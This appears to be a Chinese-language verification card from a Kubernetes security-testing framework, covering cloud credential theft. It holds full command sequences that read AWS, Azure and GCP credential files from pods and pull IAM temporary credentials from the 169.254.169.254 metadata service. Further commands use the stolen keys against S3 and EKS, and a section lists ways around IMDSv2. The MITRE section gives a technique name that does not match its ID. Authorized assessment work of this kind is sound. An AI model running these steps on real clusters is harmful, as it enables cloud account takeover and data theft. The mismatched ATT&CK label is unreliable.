---
source: manual
confidence: high
platforms: [k8s, docker]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-4.4]
mapped_compliance_families: [云凭证, 文件权限]
---

# cloud-provider-credential-theft — 云提供商凭证窃取

攻击者从节点文件系统或云元数据服务读取云提供商凭证（AWS/Azure/GCP），利用其横向移动到云控制面资源或云资源直接接管整个云账户资产。

---

## 1. 前置条件

- 节点文件系统中存在云提供商凭证文件（~/.aws/credentials、/etc/kubernetes/cloud-config、/etc/azure/...）
- 文件权限宽松或容器已具备节点 root 权限可访问
- 或容器可访问云元数据服务 169.254.169.254（IMDSv1 无需认证即可读取）

检查命令：
```bash
# [L0] 宿主机观察：检查 AWS 凭证文件
ls -la ~/.aws/ 2>/dev/null
# 期望输出: credentials 文件（默认 600）

# [L0] 宿主机观察：检查 Kubernetes 云提供商配置
ls -la /etc/kubernetes/cloud-config 2>/dev/null
# 期望输出: 文件存在（含云厂商凭证）

# [L1] 容器内观察：检查可访问云元数据服务
kubectl exec -n <ns> <pod> -- curl -s http://169.254.169.254/latest/meta-data/ 2>&1 | head -10
# 期望输出: ami-id instance-id ... 元数据接口可达
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：列出可能的云凭证文件位置
ls -la ~/.aws/credentials /etc/kubernetes/cloud-config ~/.azure/* ~/.config/gcloud/* 2>/dev/null
# 期望输出: 显示存在的云凭证文件及权限

# [L0] 宿主机观察：确认云凭证文件权限
stat -c '%a %U:%G %n' ~/.aws/credentials 2>/dev/null
# 期望输出: 600 root:root 或宽松权限

# [L1] 容器内观察：检查 cloud-config 是否被挂载到容器
kubectl get pod <pod-name> -n <ns> -o yaml | grep -A3 cloud-config | head -10
# 期望输出: 若存在 hostPath/mount 引用 /etc/kubernetes/cloud-config → 容器可读取

# [L1] 容器内观察：测试云元数据服务可达性
kubectl exec -n <ns> <pod> -- sh -c 'curl -s -o /dev/null -w "%{http_code}" http://169.254.169.254/latest/meta-data/'
# 期望输出: 200（IMDSv1 可达）

# [L1] 容器内观察：读取云元数据确认云厂商
kubectl exec -n <ns> <pod> -- sh -c 'curl -s http://169.254.169.254/latest/dynamic/instance-identity/document/'
# 期望输出: 含 region/instanceId 等信息的 JSON
```

## 3. 攻击验证

```bash
# [L1] 攻击验证（节点文件）：读取 AWS 凭证
kubectl exec -n <ns> <pod> -- cat ~/.aws/credentials 2>/dev/null || \
kubectl exec -n <ns> <pod> -- cat /etc/kubernetes/cloud-config
# 期望输出: [default] aws_access_key_id=AKIA... aws_secret_access_key=...

# [L1] 攻击验证（云元数据-IMDSv1）：获取实例角色临时凭证
kubectl exec -n <ns> <pod> -- sh -c 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# 期望输出: 角色名（如 eks-cluster-role）

ROLE_NAME=$(kubectl exec -n <ns> <pod> -- sh -c 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/' | head -1)
kubectl exec -n <ns> <pod> -- sh -c "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}"
# 期望输出: 含 AccessKeyId/SecretAccessKey/Token 的 JSON

# [L2] 攻击验证：用窃取的凭证访问云资源（AWS 列出 S3 桶）
kubectl exec -n <ns> <pod> -- sh -c "AWS_ACCESS_KEY_ID=AKIAxxx AWS_SECRET_ACCESS_KEY=xxx aws s3 ls 2>/dev/null" | head -5
# 期望输出: 列出 S3 桶（证明凭证有效）

# [L2] 攻击验证：用窃取的凭证读取云提供商控制的资源（如 EKS cluster 信息）
kubectl exec -n <ns> <pod> -- sh -c 'AWS_ACCESS_KEY_ID=AKIAxxx AWS_SECRET_ACCESS_KEY=xxx aws eks list-clusters'
# 期望输出: cluster ARN

# [L2] 宿主机端确认：记录云凭证文件读取痕迹
stat /etc/kubernetes/cloud-config 2>/dev/null | grep -E 'Access|Modify'
# 期望输出: 显示最近访问时间戳
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：本地无云凭证副本
ls /tmp/aws-creds.txt /tmp/cloud-creds.txt 2>&1
# 期望输出: No such file

# [L1] 攻击前：容器内无云凭证环境变量
kubectl exec -n <ns> <normal-pod> -- env | grep -iE 'AWS_|AZURE_|GCP_'
# 期望输出: 无输出（正常容器不应注入云凭证）

# [L1] 攻击后：通过挂载读取到云凭证
kubectl exec -n <ns> <pod> -- cat /etc/kubernetes/cloud-config > /tmp/cloud-creds.txt
head -3 /tmp/cloud-creds.txt
# 期望输出: 含 access-key/subscription-id/etc 明文 → 证明凭证泄露

# [L2] 攻击前：无凭证时不能访问云 API
aws s3 ls 2>&1 | head -3
# 期望输出: Unable to locate credentials

# [L2] 攻击后：用窃取凭证访问 S3 成功
AWS_ACCESS_KEY_ID=AKIAxxx AWS_SECRET_ACCESS_KEY=xxx aws s3 ls | head -3
# 期望输出: 桶列表 → 证明云横向移动能力

# [L1] 攻击前：IMDSv1 不可达
kubectl exec -n <ns> <secure-pod> -- sh -c 'curl -s -o /dev/null -w "%{http_code}" http://169.254.169.254/'
# 期望输出: 000 或 403（被 NetworkPolicy 限制）

# [L1] 攻击后：IMDSv1 可达并返回凭证
kubectl exec -n <ns> <pod> -- sh -c 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'
# 期望输出: 临时 AccessKey JSON → 证明元数据暴露
```

差分结论：攻击前无云凭证无法访问云资源，攻击后窃取的节点凭证/元数据返回的临时凭证能成功操作云 API，证明云提供商凭证被成功窃取。

## 5. 绕过策略

```bash
# [L1] 检查 IMDSv2 是否已强制
kubectl exec -n <ns> <pod> -- sh -c 'curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60"'
# 若无 token 返回 → IMDSv2 强制且 IMDSv1 被禁；否则 IMDSv1 可用

# [L0] 检查 NetworkPolicy 是否限制 169.254.169.254
kubectl get networkpolicy -A | grep 169.254
# 若无限制 → 容器可访问元数据

# 绕过方式：
# - [L2] 若 IMDSv2 强制，先获取 token 再用 token 读取元数据（X-aws-ec2-metadata-token header）
# - [L2] 若 cloud-config 文件加密，但 KMS 解密脚本在某 binary 中，先获取解密器
# - [L1] 若云凭证在环境变量中（注入到 ServiceAccount），通过 env 直接读取
# - [L2] 若 GCvisor 元数据需要 Header Discovery (MDv2)，使用 metadata.google.internal Metadata-Flavor header
```

## 6. 证伪条件

```bash
# [L0] 无云凭证文件
ls ~/.aws/* /etc/kubernetes/cloud-config 2>&1
# 输出: No such file or directory → 证伪

# [L1] 容器无云文件挂载且无云环境变量
kubectl exec -n <ns> <pod> -- env | grep -iE 'AWS_|AZURE_|GCP_'
# 输出: 无匹配 → 证伪

# [L1] IMDS 不可达
kubectl exec -n <ns> <pod> -- sh -c 'curl -s -o /dev/null -w "%{http_code}" http://169.254.169.254/'
# 输出: 000 或 403 → 证伪

# [L1] IMDSv2 强制（v1 被禁）
kubectl exec -n <ns> <pod> -- sh -c 'curl -s http://169.254.169.254/latest/meta-data/ -o /dev/null -w "%{http_code}"'
# 输出: 401 → 证伪（需要 v2 token）

# [L2] 窃取的凭证无效
aws s3 ls --region <region> 2>&1
# 输出: InvalidClientTokenId → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（用窃取凭证访问云 API）→ **Level 4**（外部云访问，需人工确认；仅读不写）
- **L1** 容器内探测（cat 文件、curl 元数据）→ **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察（ls/stat 凭证文件）→ **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Credential Access
- **Technique ID**: T1552.005
- **Technique Name**: Cloud Service Dashboard Credentials
- **描述**: 攻击者从节点文件系统或云实例元数据服务（IMDS）窃取云提供商凭证，以容器所在节点的云身份横向移动到云控制面资源，触发云资源滥用与跨服务窃取。